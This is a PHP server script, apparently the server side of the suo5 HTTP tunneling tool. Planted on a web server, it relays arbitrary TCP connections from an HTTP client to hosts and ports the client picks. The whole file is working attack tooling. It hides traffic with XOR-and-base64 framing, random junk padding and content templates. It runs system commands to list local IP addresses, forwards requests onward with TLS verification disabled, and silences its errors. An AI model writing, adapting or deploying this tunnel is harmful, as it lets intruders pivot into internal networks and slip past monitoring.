<?php
error_reporting(E_ERROR | E_PARSE);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
@ini_set('always_populate_raw_post_data', -1); // PHP8: deprecated, silenced
ini_set('max_execution_time', 0);

// bypass session lock
ini_set('session.use_only_cookies', false);
ini_set('session.use_cookies', false);
ini_set('session.use_trans_sid', false);
ini_set('session.cache_limiter', null);
// force use PHPSESSID as session key
if (array_key_exists('PHPSESSID', $_COOKIE)) {
    session_id($_COOKIE['PHPSESSID']);
} else {
    session_start();
    setcookie('PHPSESSID', session_id());
    session_write_close();
}

// disable output buffering
@ini_set('zlib.output_compression', 0);
ob_implicit_flush(true);
while (ob_get_level()) {
    ob_end_clean();
}

// Constants
define('BUF_SIZE', 1024 * 16);
define('MAX_READ_SIZE', 512 * 1024); // 512KB
define('FILE_PREFIX', 'suo5_');
define('TEMP_DIR', sys_get_temp_dir());

// ============================================================================
// Base64 URL-safe encoding/decoding
// ============================================================================

function base64UrlEncode($data) {
    $encoded = base64_encode($data);
    // Use strtr for better performance (single pass instead of multiple str_replace)
    $encoded = strtr($encoded, '+/', '-_');
    $encoded = rtrim($encoded, '=');
    return $encoded;
}

function base64UrlDecode($data) {
    // Use strtr for better performance (single pass instead of multiple str_replace)
    $data = strtr($data, '-_', '+/');
    $padding = strlen($data) % 4;
    if ($padding) {
        $data .= str_repeat('=', 4 - $padding);
    }
    return base64_decode($data);
}

// ============================================================================
// Protocol marshal/unmarshal
// ============================================================================

function marshalBase64($m) {
    // Add junk data (0~32 random bytes) - optimized
    $junkSize = mt_rand(0, 32);
    if ($junkSize > 0) {
        // Use openssl_random_pseudo_bytes if available (PHP 5.3+), fallback to optimized mt_rand
        if (function_exists('openssl_random_pseudo_bytes')) {
            $m['_'] = openssl_random_pseudo_bytes($junkSize);
        } else {
            // Optimized: collect in array then implode
            $junkChars = array();
            for ($i = 0; $i < $junkSize; $i++) {
                $junkChars[] = chr(mt_rand(0, 255));
            }
            $m['_'] = implode('', $junkChars);
        }
    }

    // Serialize map - optimized: use array to collect parts
    $bufParts = array();
    foreach ($m as $key => $value) {
        $bufParts[] = chr(strlen($key)) . $key . pack('N', strlen($value)) . $value;
    }
    $buf = implode('', $bufParts);

    // XOR encryption - optimized: collect in array then implode
    $xorKey = array(mt_rand(1, 255), mt_rand(1, 255));
    $bufLen = strlen($buf);
    $dataChars = array();
    for ($i = 0; $i < $bufLen; $i++) {
        $dataChars[] = chr(ord($buf[$i]) ^ $xorKey[$i % 2]);
    }
    $data = base64UrlEncode(implode('', $dataChars));

    // Build header
    $header = pack('C2N', $xorKey[0], $xorKey[1], strlen($data));
    // XOR header length bytes - optimized: direct pack instead of array loop
    $headerBytes = unpack('C*', $header);
    $headerBytes[3] = $headerBytes[3] ^ $xorKey[2 % 2];
    $headerBytes[4] = $headerBytes[4] ^ $xorKey[3 % 2];
    $headerBytes[5] = $headerBytes[5] ^ $xorKey[4 % 2];
    $headerBytes[6] = $headerBytes[6] ^ $xorKey[5 % 2];
    $header = pack('C*', $headerBytes[1], $headerBytes[2], $headerBytes[3], $headerBytes[4], $headerBytes[5], $headerBytes[6]);
    $header = base64UrlEncode($header);

    return $header . $data;
}

function unmarshalBase64($input) {
    $m = array();

    // Read 8 bytes header
    $header = fread($input, 8);
    if (strlen($header) !== 8) {
        return $m;
    }

    $header = base64UrlDecode($header);
    if (!$header || strlen($header) < 6) {
        return $m;
    }

    $headerBytes = unpack('C*', $header);
    $xorKey = array($headerBytes[1], $headerBytes[2]);

    // Decrypt length (bytes 3-6)
    for ($i = 3; $i <= 6; $i++) {
        $headerBytes[$i] = $headerBytes[$i] ^ $xorKey[($i - 1) % 2];
    }
    // Parse 4-byte length (big-endian)
    $length = ($headerBytes[3] << 24) | ($headerBytes[4] << 16) | ($headerBytes[5] << 8) | $headerBytes[6];

    if ($length > 32 * 1024 * 1024) {
        throw new Exception('invalid length');
    }

    // Read data
    $data = stream_get_contents($input, $length);
    if (strlen($data) !== $length) {
        throw new Exception('invalid data length');
    }

    $data = base64UrlDecode($data);
    if (!$data) {
        return $m;
    }

    // Decrypt data - optimized: collect in array then implode
    $dataLen = strlen($data);
    $decryptedChars = array();
    for ($i = 0; $i < $dataLen; $i++) {
        $decryptedChars[] = chr(ord($data[$i]) ^ $xorKey[$i % 2]);
    }
    $decrypted = implode('', $decryptedChars);

    // Parse map
    $i = 0;
    $len = strlen($decrypted);
    while ($i < $len) {
        if ($i + 1 > $len) break;
        $kLen = ord($decrypted[$i]);
        $i++;

        if ($i + $kLen > $len) break;
        $key = substr($decrypted, $i, $kLen);
        $i += $kLen;

        if ($i + 4 > $len) break;
        $vLenBytes = unpack('N', substr($decrypted, $i, 4));
        $vLen = $vLenBytes[1];
        $i += 4;

        if ($vLen < 0 || $i + $vLen > $len) break;
        $value = substr($decrypted, $i, $vLen);
        $i += $vLen;

        $m[$key] = $value;
    }

    return $m;
}

// ============================================================================
// Helper functions
// ============================================================================

function randomString($length) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $charactersLength = strlen($characters);
    // Optimized: collect in array then implode
    $resultChars = array();
    for ($i = 0; $i < $length; $i++) {
        $resultChars[] = $characters[mt_rand(0, $charactersLength - 1)];
    }
    return implode('', $resultChars);
}

function getFilePath($key) {
    // Sanitize key to prevent path traversal
    $safeKey = preg_replace('/[^a-zA-Z0-9_-]/', '', $key);
    if (strlen($safeKey) === 0 || strlen($safeKey) > 255) {
        throw new Exception('invalid key');
    }
    return TEMP_DIR . DIRECTORY_SEPARATOR . FILE_PREFIX . $safeKey;
}

function createStreamContext() {
    // Create stream context with socket options for PHP8 compatibility
    // These options must be set at connection creation time
    $opts = array(
        'socket' => array(
            'tcp_nodelay' => true,  // Equivalent to TCP_NODELAY
            'so_rcvbuf' => 128 * 1024,  // 128KB receive buffer
            'so_sndbuf' => 128 * 1024,  // 128KB send buffer
        ),
    );
    return stream_context_create($opts);
}

function ensureSocketOptions($socket) {
    // PHP8 compatibility: check for both resource and object types
    if (!is_resource($socket) && !is_object($socket)) {
        return false;
    }

    // Set socket options for better performance
    // Note: TCP_NODELAY, SO_RCVBUF, SO_SNDBUF are already set via stream context
    // during connection creation (see createStreamContext() and stream_socket_client())
    @stream_set_blocking($socket, false);
    @stream_set_timeout($socket, 0, 0);

    return true;
}

function newData($tunId, $data) {
    return array(
        'ac' => chr(0x01),
        'dt' => $data,
        'id' => $tunId
    );
}

function newDel($tunId) {
    return array(
        'ac' => chr(0x02),
        'id' => $tunId
    );
}

function newStatus($tunId, $status) {
    return array(
        'ac' => chr(0x03),
        's' => chr($status),
        'id' => $tunId
    );
}

function newHeartbeat($tunId) {
    return array(
        'ac' => chr(0x10),
        'id' => $tunId
    );
}

function newDirtyChunk($size) {
    $m = array('ac' => chr(0x11));
    if ($size > 0) {
        // Use openssl_random_pseudo_bytes if available (PHP 5.3+), fallback to optimized mt_rand
        if (function_exists('openssl_random_pseudo_bytes')) {
            $m['d'] = openssl_random_pseudo_bytes($size);
        } else {
            // Optimized: collect in array then implode
            $dataChars = array();
            for ($i = 0; $i < $size; $i++) {
                $dataChars[] = chr(mt_rand(0, 255));
            }
            $m['d'] = implode('', $dataChars);
        }
    }
    return $m;
}

function writeAndFlush($data, $dirtySize = 0) {
    if (!$data || strlen($data) === 0) {
        return;
    }
    echo $data;
    if ($dirtySize > 0) {
        echo marshalBase64(newDirtyChunk($dirtySize));
    }
    flush();
    if (function_exists('ob_flush')) {
        @ob_flush();
    }
}

function getKey($key) {
    @session_start();
    $value = isset($_SESSION[$key]) ? $_SESSION[$key] : null;
    session_write_close();
    return $value;
}

function putKey($key, $value) {
    @session_start();
    $_SESSION[$key] = $value;
    session_write_close();
}

function removeKey($key) {
    @session_start();
    if (isset($_SESSION[$key])) {
        unset($_SESSION[$key]);
    }
    session_write_close();
}

function processTemplateStart($sid) {
    $tplParts = getKey($sid);
    if ($tplParts === null || !is_array($tplParts) || count($tplParts) !== 3) {
        return '';
    }
    header('Content-Type: ' . $tplParts[0]);
    return $tplParts[1];
}

function processTemplateEnd($sid) {
    $tplParts = getKey($sid);
    if ($tplParts === null || !is_array($tplParts) || count($tplParts) !== 3) {
        return '';
    }
    return $tplParts[2];
}

function getDirtySize($sid) {
    $size = getKey($sid . '_jk');
    return ($size !== null) ? intval($size) : 0;
}

// ============================================================================
// Network address collection and redirect support
// ============================================================================

function collectLocalAddrs() {
    static $addrs = null;
    if ($addrs !== null) {
        return $addrs;
    }

    $addrs = array();

    // Collect local IP addresses
    if (function_exists('exec')) {
        $output = array();
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            @exec('ipconfig', $output);
            foreach ($output as $line) {
                if (preg_match('/IPv[46] Address[^:]*:\s*([0-9a-f.:]+)/i', $line, $matches)) {
                    $addrs[$matches[1]] = true;
                }
            }
        } else {
            @exec('hostname -I 2>/dev/null', $output);
            if (!empty($output)) {
                $ips = preg_split('/\s+/', trim($output[0]));
                foreach ($ips as $ip) {
                    if (!empty($ip)) {
                        $addrs[$ip] = true;
                    }
                }
            }
        }
    }

    // Add common localhost addresses
    $addrs['127.0.0.1'] = true;
    $addrs['localhost'] = true;
    $addrs['::1'] = true;

    // Add server IP if available
    if (isset($_SERVER['SERVER_ADDR'])) {
        $addrs[$_SERVER['SERVER_ADDR']] = true;
    }

    return $addrs;
}

function processRedirect($dataMap, $bodyPrefix, $bodyContent) {
    if (!isset($dataMap['r']) || empty($dataMap['r'])) {
        return false;
    }

    $redirectUrl = $dataMap['r'];

    // Remove redirect key from dataMap
    unset($dataMap['r']);

    try {
        // Rebuild request body
        $newBody = $bodyPrefix . marshalBase64($dataMap) . $bodyContent;

        // Initialize cURL
        $ch = curl_init($redirectUrl);
        if (!$ch) {
            return false;
        }

        // Set options
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $_SERVER['REQUEST_METHOD']);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $newBody);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, false);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 300);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

        // Copy headers
        $headers = array();
        foreach ($_SERVER as $key => $value) {
            if (strpos($key, 'HTTP_') === 0) {
                $header = str_replace('_', '-', substr($key, 5));
                if (!in_array($header, array('HOST', 'CONTENT-LENGTH', 'CONTENT-TYPE', 'TRANSFER-ENCODING'))) {
                    $headers[] = $header . ': ' . $value;
                }
            }
        }

        // Add required headers
        if (isset($_SERVER['CONTENT_TYPE'])) {
            $headers[] = 'Content-Type: ' . $_SERVER['CONTENT_TYPE'];
        }
        $headers[] = 'Content-Length: ' . strlen($newBody);
        $headers[] = 'Connection: close';

        // Parse redirect URL to get host
        $urlParts = parse_url($redirectUrl);
        if (isset($urlParts['host'])) {
            $headers[] = 'Host: ' . $urlParts['host'];
        }

        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        // Write response directly to output
        curl_setopt($ch, CURLOPT_WRITEFUNCTION, function($curl, $data) {
            echo $data;
            flush();
            if (function_exists('ob_flush')) {
                @ob_flush();
            }
            return strlen($data);
        });

        // Execute
        $result = curl_exec($ch);
        curl_close($ch);

        return $result !== false;

    } catch (Exception $e) {
        error_log("[Redirect] Failed: " . $e->getMessage());
        return false;
    }
}

// ============================================================================
// Mode: Handshake (0x00)
// ============================================================================

function processHandshake($dataMap, $tunId) {
    // Check for redirect first
    if (isset($dataMap['r']) && !empty($dataMap['r'])) {
        // Let main process handle redirect
        return;
    }

    $sid = randomString(16);

    // Parse template
    $tplData = isset($dataMap['tpl']) ? $dataMap['tpl'] : '';
    $contentTypeData = isset($dataMap['ct']) ? $dataMap['ct'] : '';

    if ($tplData && $contentTypeData) {
        $parts = explode('#data#', $tplData, 2);
        if (count($parts) === 2) {
            putKey($sid, array($contentTypeData, $parts[0], $parts[1]));
        } else {
            putKey($sid, array());
        }
    } else {
        putKey($sid, array());
    }

    // Parse dirty size
    $dirtySizeData = isset($dataMap['jk']) ? $dataMap['jk'] : '';
    if ($dirtySizeData) {
        $dirtySize = intval($dirtySizeData);
        if ($dirtySize < 0) {
            $dirtySize = 0;
        }
        putKey($sid . '_jk', $dirtySize);
    }

    // Parse auto mode
    $isAutoData = isset($dataMap['a']) ? $dataMap['a'] : '';
    $isAuto = $isAutoData && strlen($isAutoData) > 0 && ord($isAutoData[0]) === 0x01;

    $dtData = isset($dataMap['dt']) ? $dataMap['dt'] : '';

    if ($isAuto) {
        // Auto mode - streaming response
        header('X-Accel-Buffering: no');

        writeAndFlush(processTemplateStart($sid), 0);
        writeAndFlush(marshalBase64(newData($tunId, $dtData)), 0);

        sleep(2);

        writeAndFlush(marshalBase64(newData($tunId, $sid)), 0);
        writeAndFlush(processTemplateEnd($sid), 0);
    } else {
        // Normal mode - single response
        $response = processTemplateStart($sid);
        $response .= marshalBase64(newData($tunId, $dtData));
        $response .= marshalBase64(newData($tunId, $sid));
        $response .= processTemplateEnd($sid);

        header('Content-Length: ' . strlen($response));
        writeAndFlush($response, 0);
    }
}

// ============================================================================
// Mode: Half (0x02)
// ============================================================================

function processHalfStream($dataMap, $tunId, $sid) {
    $dirtySize = getDirtySize($sid);
    $action = isset($dataMap['ac']) ? ord($dataMap['ac'][0]) : -1;

    try {
        switch ($action) {
            case 0x00: // CREATE
                performHalfCreate($dataMap, $tunId, $dirtySize);
                break;

            case 0x01: // WRITE
                performWrite($dataMap, $tunId);
                break;

            case 0x02: // DELETE
                performDelete($tunId);
                break;

            case 0x10: // HEARTBEAT
                writeAndFlush(marshalBase64(newHeartbeat($tunId)), $dirtySize);
                break;
        }
    } catch (Exception $e) {
        performDelete($tunId);
        writeAndFlush(marshalBase64(newDel($tunId)), $dirtySize);
    }
}

function performHalfCreate($dataMap, $tunId, $dirtySize) {
    $host = isset($dataMap['h']) ? $dataMap['h'] : '';
    $portStr = isset($dataMap['p']) ? $dataMap['p'] : '0';
    $port = intval($portStr);

    if ($port === 0) {
        $port = isset($_SERVER['SERVER_PORT']) ? intval($_SERVER['SERVER_PORT']) : 80;
    }

    // Try to connect with stream context for socket options (PHP8 compatible)
    $context = createStreamContext();
    $socket = @stream_socket_client(
        "tcp://{$host}:{$port}",
        $errno,
        $errstr,
        5,
        STREAM_CLIENT_CONNECT,
        $context
    );

    if (!$socket) {
        error_log("[Half-{$tunId}] Connection failed to {$host}:{$port}: errno={$errno}, err={$errstr}");
        writeAndFlush(marshalBase64(newStatus($tunId, 0x01)), $dirtySize);
        return;
    }

    // Configure socket options for better performance
    ensureSocketOptions($socket);

    // Initialize session
    putKey($tunId . '_ok', true);
    putKey($tunId . '_write_buf', '');

    // Send success status
    writeAndFlush(marshalBase64(newStatus($tunId, 0x00)), $dirtySize);

    // Enter read loop
    $lastActivityTime = time();
    $loopCount = 0;
    $consecutiveEmptyReads = 0;

    while (true) {
        $loopCount++;

        // Check if connection is still active
        $okStatus = getKey($tunId . '_ok');
        if ($okStatus === false || $okStatus === null) {
            error_log("[Half-{$tunId}] Connection closed by client");
            break;
        }

        // Check if client disconnected
        if (connection_aborted()) {
            error_log("[Half-{$tunId}] Client connection aborted");
            break;
        }

        // Read from socket with better timeout (100ms for better CPU efficiency)
        $read = array($socket);
        $write = null;
        $except = array($socket);
        $result = @stream_select($read, $write, $except, 0, 100000); // 100ms timeout

        if ($result === false) {
            error_log("[Half-{$tunId}] stream_select failed");
            break;
        }

        // Check for socket exceptions
        if (!empty($except)) {
            error_log("[Half-{$tunId}] Socket exception detected");
            break;
        }

        if ($result > 0 && in_array($socket, $read)) {
            $data = @fread($socket, BUF_SIZE);
            $eofStatus = feof($socket);

            if ($data === false || $eofStatus) {
                error_log("[Half-{$tunId}] Socket closed (feof={$eofStatus})");
                break;
            }
            if (strlen($data) > 0) {
                writeAndFlush(marshalBase64(newData($tunId, $data)), $dirtySize);
                $lastActivityTime = time();
                $consecutiveEmptyReads = 0;
            } else {
                $consecutiveEmptyReads++;
                // If we get too many empty reads, something might be wrong
                if ($consecutiveEmptyReads > 100) {
                    error_log("[Half-{$tunId}] Too many consecutive empty reads");
                    break;
                }
            }
        }

        // Write to socket
        $writeBuf = getKey($tunId . '_write_buf');
        if ($writeBuf && strlen($writeBuf) > 0) {
            $expectedLen = strlen($writeBuf);
            putKey($tunId . '_write_buf', '');
            $written = @fwrite($socket, $writeBuf);

            if ($written === false) {
                error_log("[Half-{$tunId}] Write failed");
                break;
            }
            if ($written < $expectedLen) {
                error_log("[Half-{$tunId}] PARTIAL WRITE! expected={$expectedLen}, actual={$written}");
                // Put back unwritten data at the beginning
                $unwritten = substr($writeBuf, $written);
                $existingBuf = getKey($tunId . '_write_buf');
                putKey($tunId . '_write_buf', $unwritten . $existingBuf);
            }
            $lastActivityTime = time();
        }

        // Timeout check (60 seconds)
        $currentTime = time();
        if ($currentTime - $lastActivityTime > 60) {
            error_log("[Half-{$tunId}] Timeout after 60s ({$loopCount} iterations)");
            break;
        }

        // Send periodic heartbeat to keep connection alive
        if ($loopCount % 50 === 0 && $currentTime - $lastActivityTime > 5) {
            writeAndFlush(marshalBase64(newHeartbeat($tunId)), $dirtySize);
        }
    }

    // Cleanup
    error_log("[Half-{$tunId}] Exiting loop after {$loopCount} iterations");
    @fclose($socket);
    removeKey($tunId . '_ok');
    removeKey($tunId . '_write_buf');
    writeAndFlush(marshalBase64(newDel($tunId)), $dirtySize);
}

// ============================================================================
// Mode: Classic (0x03)
// ============================================================================

function processClassic($dataMap, $tunId, $respBodyStream, &$needWorker, &$workerSocket, &$workerTunId) {
    $sendClose = true;

    try {
        $action = isset($dataMap['ac']) ? ord($dataMap['ac'][0]) : -1;

        switch ($action) {
            case 0x00: // CREATE
                $result = performClassicCreate($dataMap, $tunId);
                fwrite($respBodyStream, $result['data']);
                if ($result['socket']) {
                    $needWorker = true;
                    $workerSocket = $result['socket'];
                    $workerTunId = $tunId;
                }
                break;

            case 0x01: // WRITE + READ
                performWrite($dataMap, $tunId);
                $readData = performRead($tunId);
                fwrite($respBodyStream, $readData);
                break;

            case 0x02: // DELETE
                $sendClose = false;
                performDelete($tunId);
                break;
        }
    } catch (Exception $e) {
        performDelete($tunId);
        if ($sendClose) {
            fwrite($respBodyStream, marshalBase64(newDel($tunId)));
        }
    }
}

function performClassicCreate($dataMap, $tunId) {
    $host = isset($dataMap['h']) ? $dataMap['h'] : '';
    $portStr = isset($dataMap['p']) ? $dataMap['p'] : '0';
    $port = intval($portStr);

    if ($port === 0) {
        $port = isset($_SERVER['SERVER_PORT']) ? intval($_SERVER['SERVER_PORT']) : 80;
    }

    // Try to connect with stream context for socket options (PHP8 compatible)
    $context = createStreamContext();
    $socket = @stream_socket_client(
        "tcp://{$host}:{$port}",
        $errno,
        $errstr,
        3,
        STREAM_CLIENT_CONNECT,
        $context
    );

    if (!$socket) {
        error_log("[Classic-{$tunId}] Connection failed to {$host}:{$port}: errno={$errno}, err={$errstr}");
        return array(
            'data' => marshalBase64(newStatus($tunId, 0x01)),
            'socket' => null
        );
    }

    // Configure socket options for better performance
    ensureSocketOptions($socket);

    // Initialize session
    putKey($tunId . '_ok', true);
    putKey($tunId . '_read_buf', '');
    putKey($tunId . '_write_buf', '');

    // Return success response and socket for background worker
    return array(
        'data' => marshalBase64(newStatus($tunId, 0x00)),
        'socket' => $socket
    );
}

function classicBackgroundWorker($socket, $tunId) {
    @ignore_user_abort(true);
    @set_time_limit(0);

    $lastActivityTime = time();
    $loopCount = 0;
    $consecutiveEmptyReads = 0;

    while (true) {
        $loopCount++;

        // Check if connection is still active
        $okStatus = getKey($tunId . '_ok');
        if ($okStatus === false || $okStatus === null) {
            error_log("[Classic-{$tunId}] Connection closed by client");
            break;
        }

        // Read from socket with better timeout (100ms for better CPU efficiency)
        $read = array($socket);
        $write = null;
        $except = array($socket);
        $result = @stream_select($read, $write, $except, 0, 100000); // 100ms timeout

        if ($result === false) {
            error_log("[Classic-{$tunId}] stream_select failed");
            break;
        }

        // Check for socket exceptions
        if (!empty($except)) {
            error_log("[Classic-{$tunId}] Socket exception detected");
            break;
        }

        if ($result > 0 && in_array($socket, $read)) {
            $data = @fread($socket, BUF_SIZE);
            $eofStatus = feof($socket);

            if ($data === false || $eofStatus) {
                error_log("[Classic-{$tunId}] Socket closed (feof={$eofStatus})");
                break;
            }
            if (strlen($data) > 0) {
                // Append to read buffer using session
                $key = $tunId . '_read_buf';
                $existingBuf = getKey($key);
                if ($existingBuf === null) {
                    $existingBuf = '';
                }
                putKey($key, $existingBuf . $data);

                $lastActivityTime = time();
                $consecutiveEmptyReads = 0;
            } else {
                $consecutiveEmptyReads++;
                // If we get too many empty reads, something might be wrong
                if ($consecutiveEmptyReads > 100) {
                    error_log("[Classic-{$tunId}] Too many consecutive empty reads");
                    break;
                }
            }
        }

        // Write to socket
        $writeBuf = getKey($tunId . '_write_buf');
        if ($writeBuf && strlen($writeBuf) > 0) {
            $expectedLen = strlen($writeBuf);
            putKey($tunId . '_write_buf', '');
            $written = @fwrite($socket, $writeBuf);

            if ($written === false) {
                error_log("[Classic-{$tunId}] Write failed");
                break;
            }
            if ($written < $expectedLen) {
                error_log("[Classic-{$tunId}] PARTIAL WRITE! expected={$expectedLen}, actual={$written}");
                // Put back unwritten data at the beginning
                $unwritten = substr($writeBuf, $written);
                $existingBuf = getKey($tunId . '_write_buf');
                putKey($tunId . '_write_buf', $unwritten . $existingBuf);
            }
            $lastActivityTime = time();
        }

        // Timeout check (300 seconds for classic mode)
        $currentTime = time();
        if ($currentTime - $lastActivityTime > 60) {
            error_log("[Classic-{$tunId}] Timeout after 60s ({$loopCount} iterations)");
            break;
        }
    }

    // Cleanup
    error_log("[Classic-{$tunId}] Background worker exiting after {$loopCount} iterations");
    @fclose($socket);
    removeKey($tunId . '_ok');
    removeKey($tunId . '_read_buf');
    removeKey($tunId . '_write_buf');
}

function performWrite($dataMap, $tunId) {
    $data = isset($dataMap['dt']) ? $dataMap['dt'] : '';

    if (strlen($data) === 0) {
        return;
    }

    // Append to write buffer using session
    $key = $tunId . '_write_buf';
    $existingBuf = getKey($key);
    if ($existingBuf === null) {
        $existingBuf = '';
    }
    putKey($key, $existingBuf . $data);
}

function performRead($tunId) {
    $key = $tunId . '_read_buf';
    $readBuf = getKey($key);

    if ($readBuf === null || $readBuf === '') {
        return '';
    }

    $dataToSend = '';

    // Limit to MAX_READ_SIZE and keep remaining data
    if (strlen($readBuf) > MAX_READ_SIZE) {
        $dataToSend = substr($readBuf, 0, MAX_READ_SIZE);
        $remaining = substr($readBuf, MAX_READ_SIZE);
        putKey($key, $remaining);
    } else {
        $dataToSend = $readBuf;
        putKey($key, '');
    }

    $response = '';
    if (strlen($dataToSend) > 0) {
        $response .= marshalBase64(newData($tunId, $dataToSend));
    }

    return $response;
}

function performDelete($tunId) {
    putKey($tunId . '_ok', false);
    removeKey($tunId . '_read_buf');
    removeKey($tunId . '_write_buf');
}

// ============================================================================
// Main entry point
// ============================================================================

function process() {
    $requestBody = file_get_contents('php://input');
    if (!$requestBody) {
        return;
    }

    $bodyStream = fopen('php://memory', 'r+');
    fwrite($bodyStream, $requestBody);
    rewind($bodyStream);

    try {
        $dataMap = unmarshalBase64($bodyStream);

        if (empty($dataMap)) {
            return;
        }

        $mode = isset($dataMap['m']) ? $dataMap['m'] : '';
        $action = isset($dataMap['ac']) ? $dataMap['ac'] : '';
        $tunId = isset($dataMap['id']) ? $dataMap['id'] : '';
        $sidData = isset($dataMap['sid']) ? $dataMap['sid'] : '';

        if (!$action || strlen($action) !== 1 || !$tunId || !$mode || strlen($mode) !== 1) {
            return;
        }

        $sid = $sidData ? $sidData : '';
        $modeValue = ord($mode[0]);

        switch ($modeValue) {
            case 0x00: // Handshake
                processHandshake($dataMap, $tunId);
                break;

            case 0x02: // Half
                header('X-Accel-Buffering: no');

                $sid = isset($dataMap['sid']) ? $dataMap['sid'] : '';
                if (!$sid) {
                    header('HTTP/1.1 403 Forbidden');
                    return;
                }

                // Verify session exists (check for null, not falsy, because empty array is valid)
                $sessionData = getKey($sid);
                if ($sessionData === null) {
                    header('HTTP/1.1 403 Forbidden');
                    return;
                }

                // Read remaining body content
                $remainingBody = stream_get_contents($bodyStream);

                $dirtySize = getDirtySize($sid);

                writeAndFlush(processTemplateStart($sid), $dirtySize);

                // Process first operation
                processHalfStream($dataMap, $tunId, $sid);

                // Process remaining operations
                if (strlen($remainingBody) > 0) {
                    $bodyStream2 = fopen('php://memory', 'r+');
                    fwrite($bodyStream2, $remainingBody);
                    rewind($bodyStream2);

                    while (!feof($bodyStream2)) {
                        try {
                            $nextDataMap = unmarshalBase64($bodyStream2);
                            if (empty($nextDataMap)) {
                                break;
                            }
                            $tunId = isset($nextDataMap['id']) ? $nextDataMap['id'] : '';
                            processHalfStream($nextDataMap, $tunId, $sid);
                        } catch (Exception $e) {
                            break;
                        }
                    }
                    fclose($bodyStream2);
                }

                writeAndFlush(processTemplateEnd($sid), $dirtySize);
                break;

            case 0x03: // Classic
                $sid = isset($dataMap['sid']) ? $dataMap['sid'] : '';
                if (!$sid) {
                    header('HTTP/1.1 403 Forbidden');
                    return;
                }

                // Verify session exists (check for null, not falsy, because empty array is valid)
                $sessionData = getKey($sid);
                if ($sessionData === null) {
                    header('HTTP/1.1 403 Forbidden');
                    return;
                }

                // Read remaining body content
                $remainingBody = stream_get_contents($bodyStream);

                // Create response buffer
                $respBodyStream = fopen('php://memory', 'r+');
                fwrite($respBodyStream, processTemplateStart($sid));

                // Variables for background worker
                $needWorker = false;
                $workerSocket = null;
                $workerTunId = '';

                // Process first operation
                processClassic($dataMap, $tunId, $respBodyStream, $needWorker, $workerSocket, $workerTunId);

                // Process remaining operations
                if (strlen($remainingBody) > 0) {
                    $bodyStream2 = fopen('php://memory', 'r+');
                    fwrite($bodyStream2, $remainingBody);
                    rewind($bodyStream2);

                    while (!feof($bodyStream2)) {
                        try {
                            $nextDataMap = unmarshalBase64($bodyStream2);
                            if (empty($nextDataMap)) {
                                break;
                            }
                            $tunId = isset($nextDataMap['id']) ? $nextDataMap['id'] : '';
                            processClassic($nextDataMap, $tunId, $respBodyStream, $needWorker, $workerSocket, $workerTunId);
                        } catch (Exception $e) {
                            break;
                        }
                    }
                    fclose($bodyStream2);
                }

                fwrite($respBodyStream, processTemplateEnd($sid));

                // Send response
                rewind($respBodyStream);
                $response = stream_get_contents($respBodyStream);
                fclose($respBodyStream);

                header('Content-Length: ' . strlen($response));
                echo $response;
                flush();
                if (function_exists('ob_flush')) {
                    @ob_flush();
                }

                // Finish request and start background worker if needed
                ignore_user_abort(true);
                if ($needWorker && $workerSocket) {
                    if (function_exists('fastcgi_finish_request')) {
                        fastcgi_finish_request();
                    }
                    classicBackgroundWorker($workerSocket, $workerTunId);
                }
                break;
        }

    } catch (Exception $e) {
        // Silent error handling
    } finally {
        fclose($bodyStream);
    }
}

// Start processing
process();
